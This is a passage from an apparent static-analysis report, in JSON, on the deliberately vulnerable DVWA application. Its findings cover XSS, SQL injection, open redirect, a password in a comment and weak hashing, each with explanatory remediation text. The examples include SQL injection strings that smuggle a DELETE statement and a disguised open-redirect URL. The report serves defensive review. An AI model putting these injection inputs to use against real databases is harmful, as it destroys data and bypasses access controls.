tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4683/?engineType=SCA&issue=D169BBDAA12DEAB5183DF3D8E215D862"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4637",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 499 of dvwaPage.inc.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4637/?engineType=SCA&issue=B20975E25F6257FE5E2EAD6288BBB676"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4446",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in dvwaPage.inc.php on line 511.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4446/?engineType=SCA&issue=347EB4D8D04F5B543316E04AB7E299EE"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4529",
          "shortDescription" : {
            "text" : "Open Redirect"
          },
          "fullDescription" : {
            "text" : "The file dvwaPage.inc.php passes unvalidated data to an HTTP redirect function on line 533. Allowing unvalidated input to control the URL used in a redirect can aid phishing attacks.\n\n\n"
          },
          "help" : {
            "text" : "Redirects allow web applications to direct users to different pages within the same application or to external sites. Applications utilize redirects to aid in site navigation and, in some cases, to track how users exit the site. Open redirect vulnerabilities occur when a web application redirects clients to any arbitrary URL that can be controlled by an attacker.\n\nAttackers might utilize open redirects to trick users into visiting a URL to a trusted site, but then redirecting them to a malicious site. By encoding the URL, an attacker can make it difficult for end-users to notice the malicious destination of the redirect, even when it is passed as a URL parameter to the trusted site. Open redirects are often abused as part of phishing scams to harvest sensitive end-user data.\n\n\nThe data is sent at header() in dvwaPage.inc.php on line 533.\n\n\nExample 1: The following PHP code instructs the user's browser to open a URL parsed from the dest request parameter when a user clicks the link.\n\n\n    &lt;%\n        ...\n        $strDest = $_GET[\"dest\"];\n        header(\"Location: \" . $strDest);\n        ...\n    %&gt;\n\n\nIf a victim received an email instructing them to follow a link to \"http://trusted.example.com/ecommerce/redirect.php?dest=www.wilyhacker.com\", the user would likely click on the link believing they would be transferred to the trusted site. However, when the victim clicks the link, the code in Example 1 will redirect the browser to \"http://www.wilyhacker.com\".\n\nMany users have been educated to always inspect URLs they receive in emails to make sure the link specifies a trusted site they know. However, if the attacker Hex encoded the destination url as follows:\n\"http://trusted.example.com/ecommerce/redirect.php?dest=%77%69%6C%79%68%61%63%6B%65%72%2E%63%6F%6D\"\n\nthen even a savvy end-user may be fooled into following the link.\n\nUnvalidated user input should not be allowed to control the destination URL in a redirect. Instead, use a level of indirection: create a list of legitimate URLs that users are allowed to specify and only allow users to select from the list. With this approach, input provided by users is never used directly to specify a URL for redirects.\n\nExample 2: The following code references an array populated with valid URLs. The link the user clicks passes in the array index that corresponds to the desired URL.\n\n\n    &lt;%\n        ...\n            $strDest = intval($_GET[\"dest\"]);\n            if(($strDest &gt;= 0) &amp;&amp; ($strDest &lt;= count ($strURLArray) - 1 ))\n            {\n                $strFinalURL = $strURLArray[strDest];\n                header(\"Location: \" . $strFinalURL);\n            }\n        ...\n    %&gt;\n\n\nIn some situations this approach is impractical because the set of legitimate URLs is too large or too hard to keep track of. In such cases, use a similar approach to restrict the domains that users can be redirected to, which can at least prevent attackers from sending users to malicious external sites.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4529/?engineType=SCA&issue=6A7765E6B52AD9D45C3ED9912B74DE8B"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4552",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4552/?engineType=SCA&issue=77981058BFBB71926CF0405EAC3D1B99"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4390",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 82 of example.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in example.php on line 82.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4390/?engineType=SCA&issue=1377228420F7C55FC1420711846BB5A4"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4489",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 82 of example.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in example.php on line 82.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4489/?engineType=SCA&issue=5792ABB522BB3890BAFEAD38BFA35D09"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4641",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 82 of example.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
